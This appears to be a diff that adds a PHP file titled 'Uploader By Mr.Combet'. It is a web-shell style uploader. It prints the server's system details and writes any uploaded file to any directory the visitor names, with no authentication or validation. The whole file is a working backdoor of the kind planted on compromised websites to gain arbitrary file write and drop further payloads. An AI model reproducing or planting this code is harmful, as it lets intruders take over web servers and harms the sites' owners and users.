@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<title>Uploader By Mr.Combet</title>
+<body style="margin-left:auto;margin-right:auto;width: 99%;background-color: black;color:black;text-align: center;">
+<div style="color:yellow;">
+<?
+echo "<h3 style='border: 2px solid #00bfff;border-radius: 5px;margin-bottom:5px;color: yellow;padding: 5px;'>".php_uname()."</h3>";
+?>
+<form action="" method="post" enctype="multipart/form-data">
+   <input type="text" style="padding:5px;border: 2px solid #00bfff;border-radius: 5px;width:303px;margin-bottom:4px;background-color: transparent;color: yellow;" name="dir"  placeholder="directory">
+   <input type="file" style="padding:2px;border: 2px solid #00bfff;border-radius: 5px;color:yellow;margin-bottom:4px" name="file" >
+    <input type="submit" style="padding:5px;border: 2px solid #00bfff;border-radius: 5px;background-color: transparent;color: yellow;margin-bottom:4px;padding-left: 10px;padding-right: 10px;" value="Submit" name="submit">
+</form>
+<?
+if(isset($_POST['submit'])) {
+$target_dir = $_POST['dir'];
+$target_file = $target_dir . basename($_FILES["file"]["name"]);
+
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+        echo "Upload <a href='$target_file' style='color: yellow;text-decoration: none;'>Successful !!</a>";
+    } else {
+        echo "Upload Failed !!";
+    }
+  }
+
+?>
+</div>
+</body>
+</html>
